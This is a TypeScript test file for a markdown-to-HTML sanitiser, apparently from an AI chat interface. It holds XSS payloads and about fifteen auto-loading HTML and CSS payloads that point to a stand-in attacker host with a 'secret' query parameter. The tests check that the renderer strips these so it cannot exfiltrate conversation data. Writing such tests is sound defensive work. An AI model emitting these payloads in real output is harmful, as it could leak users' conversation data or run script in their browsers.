import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("converts Markdown to HTML", () => {
    expect(renderMarkdown("# Title")).toContain("<h1>Title</h1>");
    expect(renderMarkdown("**bold**")).toContain("<strong>bold</strong>");
    expect(renderMarkdown("```\nconst a = 1;\n```")).toContain(
      "<pre><code>const a = 1;\n</code></pre>",
    );
  });

  it("strips <script> tags", () => {
    const html = renderMarkdown("hello <script>alert(1)</script>");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert(1)");
  });

  it("strips inline event handler attributes", () => {
    const html = renderMarkdown(
      '<img src="data:image/png;base64,AA==" onerror="alert(1)">',
    );
    expect(html).toContain("<img");
    expect(html).not.toContain("onerror");
  });

  it("removes javascript: URLs from links", () => {
    const html = renderMarkdown("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("removes javascript: URLs from Markdown images", () => {
    const html = renderMarkdown("![x](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("strips event handlers on inline <svg>", () => {
    const html = renderMarkdown('<svg onload="alert(1)"></svg>');
    expect(html).not.toContain("onload");
  });

  it("removes data:text/html URLs from links", () => {
    const html = renderMarkdown(
      '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    );
    expect(html).not.toContain("data:text/html");
  });

  it("strips <iframe> elements", () => {
    const html = renderMarkdown('<iframe src="https://example.com"></iframe>');
    expect(html).not.toContain("<iframe");
  });
});

const ATTACKER = "https://attacker.test/x?d=secret";

/** Every attribute value in the rendered HTML, except link targets that need a click. */
function autoLoadedUrls(html: string): string[] {
  const doc = new DOMParser().parseFromString(html, "text/html");
  return [...doc.body.querySelectorAll("*")].flatMap((el) =>
    [...el.attributes]
      .filter((a) => !(el.tagName === "A" && a.name === "href"))
      .map((a) => a.value)
      .filter((v) => v.includes("attacker.test")),
  );
}

describe("renderMarkdown: no automatic requests to external servers", () => {
  // Paths that contact an external server just by being rendered, which could carry conversation data in the URL
  it.each([
    ["Markdown image", `![a](${ATTACKER})`],
    ["<img src>", `<img src="${ATTACKER}">`],
    [
      "<img srcset>",
      `<img src="data:image/png;base64,AA==" srcset="${ATTACKER} 2x">`,
    ],
    ["style attribute", `<p style="background:url(${ATTACKER})">x</p>`],
    ["<style>", `<style>body{background:url(${ATTACKER})}</style>x`],
    ["<video>", `<video poster="${ATTACKER}" src="${ATTACKER}"></video>`],
    ["<audio>", `<audio src="${ATTACKER}"></audio>`],
    ["<picture><source>", `<picture><source srcset="${ATTACKER}"></picture>`],
    ["<input type=image>", `<input type="image" src="${ATTACKER}">`],
    [
      "<table background>",
      `<table background="${ATTACKER}"><tr><td>x</td></tr></table>`,
    ],
    ["<svg><image>", `<svg><image href="${ATTACKER}"></image></svg>`],
    ["<svg><use>", `<svg><use href="${ATTACKER}#a"></use></svg>`],
    [
      "<svg><feImage>",
      `<svg><filter><feImage href="${ATTACKER}"/></filter></svg>`,
    ],
    ["<a ping>", `<a href="https://ok.test" ping="${ATTACKER}">l</a>`],
    ["<form action>", `<form action="${ATTACKER}"><button>go</button></form>`],
  ])("blocks %s", (_, input) => {
    expect(autoLoadedUrls(renderMarkdown(input))).toEqual([]);
  });

  it("turns an external image into a link the user must click", () => {
    const doc = new DOMParser().parseFromString(
      renderMarkdown(`![diagram](${ATTACKER})`),
      "text/html",
    );
    expect(doc.querySelector("img")).toBeNull();
    const link = doc.querySelector("a");
    expect(link?.getAttribute("href")).toBe(ATTACKER);
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link?.textContent).toBe("🖼 diagram");
  });

  it("labels an external image without alt text with its URL", () => {
    const doc = new DOMParser().parseFromString(
      renderMarkdown(`<img src="${ATTACKER}">`),
      "text/html",
    );
    expect(doc.querySelector("a")?.textContent).toBe(`🖼 ${ATTACKER}`);
  });

  it("does not link non-http image sources", () => {
    const doc = new DOMParser().parseFromString(
      renderMarkdown('<img src="/local.png" alt="local">'),
      "text/html",
    );
    expect(doc.querySelector("img")).toBeNull();
    expect(doc.querySelector("a")).toBeNull();
    expect(doc.body.textContent).toContain("🖼 local");
  });

  it("keeps inline data: images, which need no request", () => {
    const html = renderMarkdown("![ok](data:image/png;base64,AA==)");
    expect(html).toContain('<img src="data:image/png;base64,AA==" alt="ok">');
  });

  it("keeps ordinary links (they need a click)", () => {
    expect(renderMarkdown(`[l](${ATTACKER})`)).toContain(
      `<a href="${ATTACKER.replace("&", "&amp;")}">l</a>`,
    );
  });
});
